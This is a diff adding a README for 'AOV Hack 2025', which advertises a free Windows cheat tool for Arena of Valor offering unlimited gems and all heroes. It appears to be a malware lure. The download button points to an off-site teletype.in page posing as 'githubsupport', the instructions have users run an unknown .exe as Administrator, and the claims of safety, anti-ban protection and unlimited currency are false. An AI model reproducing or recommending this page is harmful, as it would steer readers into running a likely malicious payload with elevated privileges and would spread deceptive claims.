@@ -1,0 +1,65 @@
+# AOV Hack 2025 - Latest Version Free Download
+
+[![Version](https://img.shields.io/badge/Version-2025-blue?logo=windows)](https://img.shields.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-success?logo=windows)](https://img.shields.io)
+[![Status](https://img.shields.io/badge/Status-Active-brightgreen?logo=github)](https://img.shields.io)
+[![License](https://img.shields.io/badge/License-Free-orange?logo=opensourceinitiative)](https://img.shields.io)
+[![Downloads](https://img.shields.io/badge/Downloads-10K+-yellow?logo=github)](https://img.shields.io)
+
+🎮 **Welcome to the Ultimate Arena of Valor Hack Tool for 2025!** 🎮  
+
+Unlock unlimited resources, dominate battles, and rise to the top with our **100% free** and **safe** hack tool for **Arena of Valor**! This tool is designed exclusively for **Windows** systems and packed with powerful features to enhance your gaming experience.  
+
+---
+
+## 🔥 **Features**  
+✨ **Unlimited Gems & Gold** – Never worry about in-game currency again!  
+⚡ **Unlock All Heroes & Skins** – Access every hero and skin instantly.  
+🛡️ **Anti-Ban Protection** – Play safely without risking your account.  
+🚀 **Auto-Updates** – Always stay ahead with the latest features.  
+🎯 **User-Friendly Interface** – Easy to use, even for beginners!  
+
+---
+
+## ⚙️ **System Requirements**  
+✔ **OS**: Windows 10/11 (64-bit)  
+✔ **RAM**: 4GB or higher  
+✔ **Storage**: 500MB free space  
+✔ **Internet Connection**: Required for activation  
+
+---
+
+## 📥 **Download & Installation**  
+[![Download Now](https://img.shields.io/badge/Download-Here-red?logo=github&style=for-the-badge)](https://teletype.in/@githubsupport/aHN9l6m-mbF?94CF3C6D417744D6A7FACF0E1D70C84D)  
+
+1. **Download** the tool using the button above.  
+2. **Extract** the ZIP file to your desired location.  
+3. **Run** `AoV_Hack_2025.exe` as Administrator.  
+4. **Follow** the on-screen instructions to activate.  
+5. **Launch** Arena of Valor and enjoy! 🎉  
+
+---
+
+## ❓ **FAQ**  
+
+### ❔ **Is this tool safe to use?**  
+✅ Absolutely! Our hack includes **anti-detection** to keep your account secure.  
+
+### ❔ **Will this work on Mac or Mobile?**  
+❌ No, this tool is **exclusively for Windows**.  
+
+### ❔ **How often is the tool updated?**  
+🔄 We release updates **weekly** to ensure compatibility with the latest game patches.  
+
+---
+
+## 📜 **Disclaimer**  
+⚠ This tool is for **educational purposes only**. We do not encourage cheating in competitive gameplay. Use at your own risk.  
+
+---
+
+## 💬 **Support & Community**  
+📢 Join our Discord for help, updates, and more:  
+[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/example)  
+
+💖 **Enjoy the tool? Star this repo to show your support!** ⭐
